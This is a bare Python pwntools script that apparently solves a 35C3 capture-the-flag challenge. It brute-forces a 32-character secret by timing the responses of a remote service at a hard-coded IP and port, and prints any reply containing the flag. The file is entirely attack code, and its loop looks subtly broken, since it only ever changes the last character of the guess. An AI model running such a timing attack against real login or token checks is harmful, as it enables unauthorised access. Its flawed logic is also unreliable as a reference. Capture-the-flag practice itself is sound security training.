from pwn import *
import time
import string

payload = "a" * 32

for j in range(32):
    print("Char %d" % j)
    for i in string.ascii_lowercase + string.digits:
        conn = remote("35.207.158.95", 1337)

        list1 = list(payload)
        list1[31] = i
        payload = ''.join(list1)

        conn.recvuntil(":")
        conn.sendline(payload)
        
        begin = time.time()
        res = conn.recvall()
        end = time.time()

        if "35C3" in res:
            print(res)

        elapsed = end - begin
        if (elapsed > 0.85 + 0.66*(j+1)):
            print(payload)
            print(elapsed)
            
            break
    